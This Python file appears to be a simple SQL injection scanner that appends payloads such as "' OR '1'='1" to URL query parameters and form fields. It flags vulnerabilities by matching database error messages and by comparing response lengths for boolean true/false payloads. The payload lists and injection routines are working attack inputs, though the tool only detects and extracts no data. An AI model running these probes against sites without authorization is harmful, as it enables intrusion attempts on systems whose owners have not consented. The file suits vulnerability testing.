import requests
import urllib.parse
import time
from bs4 import BeautifulSoup

# SQL injection payloads
ERROR_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "';--"]
BOOLEAN_TRUE = ["' OR '1'='1' -- "]
BOOLEAN_FALSE = ["' AND '1'='2' -- "]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "sql syntax",
    "mysql_fetch",
    "ora-",
    "sqlstate"
]

HEADERS = {"User-Agent": "CyberscanX/1.0 (Educational)"}

def fetch(url, params=None, data=None, method="get", timeout=8):
    try:
        if method == "get":
            return requests.get(url, params=params, headers=HEADERS, timeout=timeout)
        else:
            return requests.post(url, data=data, headers=HEADERS, timeout=timeout)
    except:
        return None

def contains_error(text):
    if not text:
        return False
    text = text.lower()
    return any(signature in text for signature in ERROR_SIGNATURES)

def extract_forms(html, base_url):
    soup = BeautifulSoup(html or "", "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action") or base_url
        method = (form.get("method") or "get").lower()
        inputs = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            if inp.get("name"):
                inputs[inp.get("name")] = inp.get("value") or ""
        forms.append({
            "action": urllib.parse.urljoin(base_url, action),
            "method": method,
            "inputs": inputs
        })
    return forms

def test_error_get(target_url, timeout, delay):
    findings = []
    parsed = urllib.parse.urlparse(target_url)
    qs = urllib.parse.parse_qs(parsed.query)

    if not qs:
        return findings

    for param in qs:
        orig = qs[param][0]
        for payload in ERROR_PAYLOADS:
            new_qs = qs.copy()
            new_qs[param] = [orig + payload]

            new_url = urllib.parse.urlunparse(
                parsed._replace(
                    query=urllib.parse.urlencode({k: v[0] for k, v in new_qs.items()})
                )
            )

            r = fetch(new_url, timeout=timeout)
            time.sleep(delay)

            if r and contains_error(r.text):
                findings.append({
                    "type": "error-get",
                    "param": param,
                    "payload": payload,
                    "url": new_url,
                    "response_len": len(r.text),
                    "resp_text": r.text[:5000]
                })
                break

    return findings

def test_boolean_logic(target_url, timeout, delay):
    findings = []
    parsed = urllib.parse.urlparse(target_url)
    qs = urllib.parse.parse_qs(parsed.query)

    if not qs:
        return findings

    base_r = fetch(target_url, timeout=timeout)
    base_len = len(base_r.text) if base_r else 0

    for param in qs:
        orig = qs[param][0]

        true_qs = qs.copy()
        true_qs[param] = [orig + BOOLEAN_TRUE[0]]
        url_true = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode({k: v[0] for k, v in true_qs.items()}))
        )

        false_qs = qs.copy()
        false_qs[param] = [orig + BOOLEAN_FALSE[0]]
        url_false = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode({k: v[0] for k, v in false_qs.items()}))
        )

        r_true = fetch(url_true, timeout=timeout)
        r_false = fetch(url_false, timeout=timeout)
        time.sleep(delay)

        if r_true and r_false:
            if abs(len(r_true.text) - len(r_false.text)) > max(25, base_len * 0.02):
                findings.append({
                    "type": "boolean-get",
                    "param": param,
                    "url_true": url_true,
                    "url_false": url_false,
                    "len_true": len(r_true.text),
                    "len_false": len(r_false.text),
                    "resp_text_true": r_true.text[:3000],
                    "resp_text_false": r_false.text[:3000]
                })

    return findings

def test_forms(page_url, timeout, delay):
    findings = []
    r = fetch(page_url, timeout=timeout)
    if not r:
        return findings

    forms = extract_forms(r.text, page_url)

    for form in forms:
        for field in form["inputs"]:
            orig = form["inputs"].get(field, "")
            for payload in ERROR_PAYLOADS:
                data = form["inputs"].copy()
                data[field] = orig + payload
                r2 = fetch(form["action"], data=data, method=form["method"], timeout=timeout)
                time.sleep(delay)

                if r2 and contains_error(r2.text):
                    findings.append({
                        "type": "error-form",
                        "action": form["action"],
                        "field": field,
                        "payload": payload,
                        "method": form["method"].upper(),
                        "response_len": len(r2.text),
                        "resp_text": r2.text[:5000]
                    })
                    break

    return findings

def scan_target(target_url, timeout=8, delay=0.2):
    results = []
    try:
        results += test_error_get(target_url, timeout, delay)
        results += test_boolean_logic(target_url, timeout, delay)
        results += test_forms(target_url, timeout, delay)
    except:
        pass
    return results

